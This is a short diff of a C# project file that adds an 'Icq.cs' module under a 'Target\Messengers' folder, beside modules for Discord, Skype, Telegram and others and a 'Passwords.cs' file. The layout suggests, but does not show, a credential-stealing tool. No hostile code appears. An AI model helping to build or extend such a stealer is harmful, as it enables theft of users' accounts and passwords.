@@ -52,7 +52,7 @@
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
     <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
-	  <AllowedReferenceRelatedFileExtensions>
+    <AllowedReferenceRelatedFileExtensions>
 		  *.pdb;
 		  *.xml
 	  </AllowedReferenceRelatedFileExtensions>
@@ -257,6 +257,7 @@
     <Compile Include="Target\Messengers\Discord.cs" />
     <Compile Include="Target\Messengers\Outlook.cs" />
     <Compile Include="Target\Messengers\Pidgin.cs" />
+    <Compile Include="Target\Messengers\Icq.cs" />
     <Compile Include="Target\Messengers\Skype.cs" />
     <Compile Include="Target\Messengers\Telegram.cs" />
     <Compile Include="Target\Passwords.cs" />
